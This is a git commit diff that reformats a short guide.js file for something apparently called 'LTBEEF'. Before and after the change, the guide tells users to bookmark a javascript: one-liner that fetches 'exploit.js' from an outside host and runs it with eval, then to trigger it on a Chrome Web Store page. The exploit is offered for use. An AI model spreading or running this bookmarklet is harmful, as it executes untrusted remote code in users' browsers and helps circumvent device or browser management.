1f5d70bcb7f8999190f63cc97e8a3d65f7d9169f
Buypass07 <idkchigo@gmail.com>
2026-04-18 09:16:35 -0400

    Fix formatting and add missing lines in guide.js

--- LTBEEF guide.js
+++ LTBEEF guide.js
@@ -1,3 +1,5 @@
 https://www.youtube.com/watch?v=LxGyfxe1MU4
-bookmark this Code! javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
-then navigate to: Chrome.google.com/webstorex, then run the bookmark!
+bookmark this Code! 
+javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
+then navigate to: 
+Chrome.google.com/webstorex, then run the bookmark!
